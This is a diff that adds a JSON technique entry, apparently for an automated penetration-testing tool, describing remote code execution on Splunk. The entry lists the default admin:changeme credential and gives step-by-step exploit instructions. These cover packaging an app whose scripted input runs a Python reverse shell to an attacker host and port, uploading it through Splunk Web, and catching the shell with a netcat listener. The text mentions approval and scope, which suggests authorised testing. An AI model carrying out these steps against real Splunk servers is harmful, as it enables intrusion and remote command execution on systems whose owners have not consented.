@@ -1,0 +1,39 @@
+{
+  "product": "splunk",
+  "associated_ports": ["8000", "8089"],
+  "techniques": [
+    {
+      "id": "splunk-app-upload-scripted-input-rce",
+      "title": "Splunk app upload with scripted input → RCE",
+      "severity": "critical",
+      "detection_signals": ["splunkd", "splunk"],
+      "preconditions": [
+        "Splunk Web reachable on 8000",
+        "free license (remote 8089 login disabled) OR usable web creds (default admin:changeme, or no-auth)"
+      ],
+      "notes": "Free license disables remote login on the 8089 management port but the web app-upload on 8000 still works. A custom app with a scripted input (inputs.conf [script://...]) runs code as the 'splunk' OS user. Default credential is admin:changeme.",
+      "detection_endpoints": [
+        "http://{target}:8000/en-US/account/login",
+        "https://{target}:8089/services/server/info"
+      ],
+      "validate_steps": [
+        "Browse http://{target}:8000/en-US/manager/launcher/apps/local to confirm app management is reachable.",
+        "Determine license (free vs enterprise) and whether login is required; free + web upload = exploitable.",
+        "Check default credential admin:changeme on the web login (single attempt, approval + scope)."
+      ],
+      "exploit_steps": [
+        "mkdir -p app/bin app/default",
+        "Write app/bin/rev.py: a Python reverse shell to {lhost}:{lport}.",
+        "Write app/default/inputs.conf: [script://./bin/rev.py]\\n disabled=false\\n interval=10\\n sourcetype=shell",
+        "tar -czf app.tar.gz app/",
+        "Upload app.tar.gz via http://{target}:8000/en-US/manager/.../apps/local (Install app from file).",
+        "Start a listener (nc -lvnp {lport}); the scripted input executes as the splunk user within ~interval seconds."
+      ],
+      "cves": [],
+      "refs": [
+        "https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/9.1/build-scripted-inputs/setting-up-a-scripted-input",
+        "https://github.com/0xjpuff/reverse_shell_splunk"
+      ]
+    }
+  ]
+}
